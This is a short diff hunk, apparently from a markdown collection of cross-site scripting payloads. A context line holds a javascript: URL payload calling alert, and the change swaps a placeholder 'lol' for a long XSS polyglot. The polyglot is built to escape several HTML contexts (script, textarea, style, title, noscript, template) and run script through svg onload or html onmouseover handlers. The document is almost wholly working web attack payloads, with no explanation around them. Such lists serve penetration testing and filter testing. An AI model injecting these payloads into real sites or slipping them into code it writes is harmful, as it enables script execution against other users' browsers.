@@ -13,7 +13,7 @@ JavaScript://%250Aalert?.(1)//
 ```
 ###
 ```
-lol
+%0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert()//'">`
 ```
 ###
 ```
